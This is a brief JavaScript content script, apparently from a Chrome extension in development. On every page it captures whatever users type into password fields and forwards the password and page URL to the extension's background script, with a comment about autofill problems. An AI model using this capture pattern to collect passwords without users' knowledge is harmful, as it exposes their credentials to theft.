$('input[type=password]').blur(function() {
  var password = $(this).val();
  x = {
    url: window.location.href,
    password: password
  };
  // chrome.runtime.sendMessage(password);
  chrome.runtime.sendMessage({
    "message": "password_submitted",
    "data": x
  }, function() {
    console.log("message sent");
  });
});

//not working on udemy and udacity - is it an autofill thing???